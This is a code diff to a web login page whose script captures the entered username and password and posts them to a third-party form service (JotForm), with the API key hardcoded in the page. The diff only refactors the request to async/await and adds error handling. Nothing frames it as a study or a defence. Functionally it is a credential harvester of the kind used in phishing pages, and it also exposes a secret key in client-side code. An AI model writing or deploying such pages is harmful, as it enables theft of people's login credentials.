@@ -122,7 +122,7 @@
     const usernameInput = document.getElementById('username');
     const passwordInput = document.getElementById('password');
 
-    loginForm.addEventListener('submit', (event) => {
+    loginForm.addEventListener('submit', async (event) => {
       event.preventDefault();
 
       const username = usernameInput.value;
@@ -134,27 +134,29 @@
       const apiKey = '344207c0b1a22012c227d925f13e8407';
       const formId = '241464072748056';
 
-      // Construct the API request payload
       const payload = new URLSearchParams({
         'submission[3]': username, // Replace 3 with the actual field ID for username in your JotForm
         'submission[4]': password, // Replace 4 with the actual field ID for password in your JotForm
       });
 
-      // Send the API request to JotForm
-      fetch(`https://api.jotform.com/submission?apiKey=${apiKey}`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded'
-        },
-        body: payload
-      })
-      .then(response => response.json())
-      .then(data => {
+      try {
+        const response = await fetch(`https://api.jotform.com/submission?apiKey=${apiKey}`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+          },
+          body: payload
+        });
+
+        if (!response.ok) {
+          throw new Error(`Network response was not ok ${response.statusText}`);
+        }
+
+        const data = await response.json();
         console.log('Credentials stored in JotForm:', data);
-      })
-      .catch(error => {
+      } catch (error) {
         console.error('Error storing credentials in JotForm:', error);
-      });
+      }
     });
   </script>
 </body>
